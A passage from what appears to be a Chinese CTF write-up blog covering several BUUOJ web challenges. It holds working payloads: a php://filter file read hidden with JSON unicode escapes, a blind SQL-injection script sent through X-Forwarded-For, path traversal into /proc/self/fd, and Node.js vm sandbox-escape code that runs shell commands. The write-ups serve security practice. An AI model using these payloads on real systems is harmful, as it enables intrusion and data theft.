class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=‘10px‘ color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot;</span> . <span class="variable">$_SERVER</span>[‘REMOTE_ADDR‘];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[‘user‘] = md5(<span class="variable">$_SERVER</span>[‘REMOTE_ADDR‘]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[‘decrypt‘])) &#123;</span><br><span class="line">    <span class="variable">$decr</span> = <span class="variable">$_GET</span>[‘decrypt‘];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_SESSION</span>[‘secret‘];</span><br><span class="line">        <span class="keyword">include</span> ‘flag_2sln2ndln2klnlksnf.php‘;</span><br><span class="line">        <span class="variable">$cipher</span> = aesEn(<span class="variable">$data</span>, ‘y1ng‘);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$decr</span> === <span class="variable">$cipher</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(‘爬‘);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">&quot;Refresh:0.1;url=index.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    <span class="variable">$length</span> = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[‘secret‘] = bin2hex(random_bytes(<span class="variable">$length</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过分析代码发现有两个要求</p>
<blockquote>
<p>X-Forwarded-For:127.0.0.1</p>
<p>$decr === $cipher</p>
</blockquote>
<p>第一个要求很容易满足，我们看第二个，需要传入变量decrypt，使其强等于<code>aesEn($data, ‘y1ng‘);</code>的加密结果在该加密算法中存在的唯一变量是 $data ,而 <code>$data = $_SESSION[‘secret‘];</code>,我们看代码最后面，可以知道 $_SESSION[‘secret‘]; 是由伪随机数长度加密得到的。</p>
<p>但是假如我们另session 为空，那么自然而然就不存在 $_SESSION[‘secret‘]; ，这个时候aesEn加密得到的值就是固定的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-128-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv</span> = md5(<span class="string">&#x27;IP&#x27;</span>,<span class="literal">true</span>);   <span class="comment">//这里的IP要填自己环境的IP</span></span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt(<span class="variable">$data</span>, <span class="variable">$method</span>,<span class="variable">$key</span>, OPENSSL_RAW_DATA , <span class="variable">$iv</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> aesEn(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;y1ng&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>传值即可</p>
<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><strong>知识点</strong></p>
<ol>
<li><strong>JSON转义字符绕过</strong></li>
<li><strong>php://filter</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$banword</span> = [</span><br><span class="line">      <span class="comment">// no path traversal</span></span><br><span class="line">      <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">      <span class="comment">// no stream wrapper</span></span><br><span class="line">      <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">      <span class="comment">// no data exfiltration</span></span><br><span class="line">      <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$body</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$json</span> = json_decode(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="variable">$page</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$content</span> || !is_valid(<span class="variable">$content</span>)) &#123;</span><br><span class="line">      <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line"><span class="variable">$content</span> = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$content</span>]);</span><br></pre></td></tr></table></figure>


<p>1.<strong>json转义字符绕过</strong></p>
<p><strong><code>\uXXXX</code>可以在JSON中转义字符，例如<code>A</code>，<code>\u0041</code>等效</strong></p>
<p>2.<strong>伪协议读取</strong></p>
<p>由于$content中不能存在 <code>/HarekazeCTF\&#123;.+\&#125;/i</code>类似内容，所有我们可以对content 进行base64 加密，这里用到了 php://filter 伪协议</p>
<p>payload：</p>
<blockquote>
<p>{“page”:”php://filter/convert.base64-encode/resource=/flag”}</p>
<p>{“page”:”\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067”}</p>
</blockquote>
<h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>不知道什么原因 页面回显极慢，没做，记录下原理</p>
<p>知识点：</p>
<ol>
<li>X-Forwarded-For 伪造</li>
<li>二次注入</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node3.buuoj.cn:27406/&quot;</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;GET&quot;</span>: <span class="string">&quot;/ HTTP/1.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;track_uuid=fdb4b6d2-49df-4480-faf2-c1ff21685796&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    print(<span class="string">&quot;第&#123;&#125;个:&quot;</span>.<span class="built_in">format</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    mid = (l + r) &gt;&gt; <span class="number">1</span>     <span class="comment">#相当于mid除2取整所得</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        head[<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;0&#x27; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;0&#125;,1))&gt;&#123;1&#125; or &#x27;0&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line"></span><br><span class="line">        html_0 = requests.post(url, headers=head)</span><br><span class="line">        head[<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;0&#x27; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;0&#125;,1))&gt;&#123;1&#125; or &#x27;0&quot;</span>.<span class="built_in">format</span>(i, mid + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        html_0 = requests.post(url, headers=head)</span><br><span class="line">        html_0 = requests.post(url, headers=head)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Last Ip: 1&quot;</span> <span class="keyword">in</span> html_0.text: <span class="comment"># 这里判断到的语句为第一个，即`.format(i, mid)`的那个</span></span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(mid) == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">    print(flag)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>




<h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p>知识点：</p>
<ol>
<li>/proc/[pid]/fd</li>
<li>反弹shell</li>
</ol>
<p><strong>linux进程管理之打开的每个进程的链接</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/proc/</span>pid/cmdline  包含了用于开始进程的命令  ；</span><br><span class="line"><span class="regexp">/proc/</span>pid/cwd 包含了当前进程工作目录的一个链接  ；</span><br><span class="line"><span class="regexp">/proc/</span>pid/environ  包含了可用进程环境变量的列表  ；</span><br><span class="line"><span class="regexp">/proc/</span>pid/exe  包含了正在进程中运行的程序链接；</span><br><span class="line"><span class="regexp">/proc/</span>pid<span class="regexp">/fd/</span>  这个目录包含了进程打开的每一个文件的链接；</span><br><span class="line"><span class="regexp">/proc/</span>pid/mem  包含了进程在内存中的内容；</span><br><span class="line"><span class="regexp">/proc/</span>pid/stat 包含了进程的状态信息；</span><br><span class="line"><span class="regexp">/proc/</span>pid/statm  包含了进程的内存使用信息。</span><br></pre></td></tr></table></figure>




<p>预期解的话基本上解法和 [V&amp;N2020 公开赛]CHECKIN 一模一样，由于不知道什么原因，一直报<code>Wrong Key!</code>，题目没有进行下去,这里就不多加赘述</p>
<p>paylaod:<code>/page?url=../../../../proc/self/fd/3</code>，这里的<code>/proc/self</code>也是一个链接文件，当进程访问此链接时，就会访问这个进程本身的<code>/proc/pid目录</code>,从而得到 secret_key ，之后反弹shell即可，flag在根目录，可以直接 cat /flag</p>
<p>非预期解</p>
<blockquote>
<p>?url=../../../../../../flag</p>
</blockquote>
<h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>vm.js 沙箱逃逸与关键字符绕过</strong></li>
<li><strong>JavaScript 模板字符串</strong></li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>js中. 可以用[]代替. (点号)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span><span class="string">``</span>反引号代替双引号</span><br><span class="line"><span class="built_in">TypeError</span>.prototype==<span class="built_in">TypeError</span>[<span class="string">`\xxx\xxx\xxx\xxx`</span>] </span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>占位符来拼接字符串</span><br><span class="line">比如这里 prototype 被过滤了，我们可以这样书写  <span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span></span><br></pre></td></tr></table></figure>
<p><strong>js测试的话可以用Error().stack直接查看报错信息，还能获取更多的信息</strong></p>
<p>payload1:</p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">function</span> ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proc`&#125;ess`&#125;`)()<span class="comment">;</span></span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(<span class="name">Buffer.from</span>(``)).a = <span class="number">1</span><span class="comment">;</span></span><br><span class="line">    &#125;catch(<span class="name">e</span>)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString()<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>


<p>payload2</p>
<p><code>join</code>拼接字符串</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(()=&gt;&#123; <span class="symbol">TypeError</span>[[<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`y`</span>,<span class="string">`p`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)][<span class="string">`a`</span>] = f=&gt;f[[<span class="string">`c`</span>,<span class="string">`o`</span>,<span class="string">`n`</span>,<span class="string">`s`</span>,<span class="string">`t`</span>,<span class="string">`r`</span>,<span class="string">`u`</span>,<span class="string">`c`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`r`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`t`</span>,<span class="string">`u`</span>,<span class="string">`r`</span>,<span class="string">`n`</span>,<span class="string">` `</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))(); try&#123; <span class="symbol">Object</span>[<span class="string">`preventExtensions`</span>](<span class="symbol">Buffer</span>[<span class="string">`from`</span>](<span class="string">``</span>))[<span class="string">`a`</span>] = <span class="number">1</span>; &#125;catch(e)&#123; return e[<span class="string">`a`</span>](()=&gt;&#123;&#125;)[<span class="string">`mainModule`</span>][[<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`q`</span>,<span class="string">`u`</span>,<span class="string">`i`</span>,<span class="string">`r`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`c`</span>,<span class="string">`h`</span>,<span class="string">`i`</span>,<span class="string">`l`</span>,<span class="string">`d`</span>,<span class="string">`_`</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))[[<span class="string">`e`</span>,<span class="string">`x`</span>,<span class="string">`e`</span>,<span class="string">`c`</span>,<span class="string">`S`</span>,<span class="string">`y`</span>,<span class="string">`n`</span>,<span class="string">`c`</span>][<span class="string">`join`</span>](<span class="string">``</span>)](<span class="string">`cat /flag`</span>)[<span class="string">`toString`</span>](); &#125; &#125;)()</span><br></pre></td></tr></table></figure>


<p><a href="https://xz.aliyun.com/t/7184#toc-10" target="_blank">Node.js 常见漏洞学习与总结</a></p>
<h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>题目没有什么难度，不过也给我提了一个醒。以前看到 Js 文件一般都是直接跳过，，以后要对Js 文件多加留意</p>
<p>payload：</p>
<p>因为回自动跳转到 /die/ ,用burp suite 抓包，总流程如下</p>
<p>/  –&gt; /chase –&gt; /leftt  –&gt; /shoot –&gt; /door  –&gt; /static/js/door.js  –&gt; /open –&gt; /static/js/open_sesame.js  –&gt;    /fight   –&gt;  /static/js/fight.js  得到如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run to scramble original flag</span></span><br><span class="line"><span class="comment">//console.log(scramble(flag, action));</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scramble</span>(<span class="params">flag, key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; key.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = key.charCodeAt(i) % flag.length;</span><br><span class="line">    <span class="keyword">let</span> temp = flag[i];</span><br><span class="line">    flag[i] = flag[n];</span><br><span class="line">    flag[n] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> action = <span class="built_in">document</span>.getElementById(<span class="string">&quot;action&quot;</span>).value;</span><br><span class="line">  <span class="keyword">var</span> flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> unscramble function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>拼接下即可得到flag</p>
<h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>知识点：ThinkPHP6.0任意文件创建</p>
<p>/robots.txt  可以发现 <a target="_blank" rel="noopener" href="http://www.thinkphp.cn/">ThinkPHP</a> V6.0.0  报错，直接搜exp</p>
<p><a href="https://www.anquanke.com/post/id/197261" target="_blank">ThinkPHP6.0任意文件创建分析   https://www.anquanke.com/post/id/197261</a></p>
<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>from for</strong></li>
<li><strong>select 0+’test’+0;</strong></li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT &#39;0&#39;+&#39;test&#39;+&#39;0&#39;；</span><br><span class="line">+------------------+</span><br><span class="line">|  &#39;0&#39;+&#39;test&#39;+&#39;0&#39;  |</span><br><span class="line">+------------------+</span><br><span class="line">|         0        |</span><br><span class="line">+------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT &#39;0&#39;+hex(&#39;test&#39;)+&#39;0&#39;；</span><br><span class="line">+-----------------------+</span><br><span class="line">|  &#39;0&#39;+hex(&#39;test&#39;)+&#39;0&#39;  |</span><br><span class="line">+-----------------------+</span><br><span class="line">|        74657374       |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;这样’test’字符串的十六进制就会成功显示出来</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT hex(&#39;flag&#39;)；</span><br><span class="line">+-----------------------+</span><br><span class="line">|      hex(&#39;flag&#39;)      |</span><br><span class="line">+-----------------------+</span><br><span class="line">|        666C6167       |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT &#39;0&#39;+hex(&#39;flag&#39;)+&#39;0&#39;；</span><br><span class="line">+-----------------------+</span><br><span class="line">|  &#39;0&#39;+hex(&#39;flag&#39;)+&#39;0&#39;  |</span><br><span class="line">+-----------------------+</span><br><span class="line">|           666         |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;flag的十六进制里存在字母。如果让它和’0’相加的话,会存在截断的问题,我们可以二次hex，让最后的结果全是数字，这样就不存在截断的问题了</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT hex(hex(&#39;flag&#39;))；</span><br><span class="line">+-----------------------+</span><br><span class="line">|    hex(hex(&#39;flag&#39;))   |</span><br><span class="line">+-----------------------+</span><br><span class="line">|   3636364336313637    |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">&#x2F;但是如果结果超过10位的话，会转成科学计数法，导致丢失数据。因此要用substr来截：</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT &#39;0&#39;+substr(hex(hex(&#39;flag&#39;)) from 1 for 10)+&#39;0&#39;;</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| &#39;0&#39;+substr(hex(hex(&#39;flag&#39;)) from 1 for 10)+&#39;0&#39; |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">|                    3636364336                  |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;这里的话因为fuzz发现逗号，information等被过滤，所有用from ... for .. 代替逗号，猜测表名为flag</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">login_url=<span class="string">&#x27;http://ad9e4b4c-00ee-47c4-8298-b750b130f0d1.node3.buuoj.cn/login.php&#x27;</span></span><br><span class="line">register_url=<span class="string">&#x27;http://ad9e4b4c-00ee-47c4-8298-b750b130f0d1.node3.buuoj.cn/register.php&#x27;</span></span><br><span class="line">content=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:/Program Files/JetBrains/PyCharm 2020.3.1/project/1.txt&#x27;</span>, <span 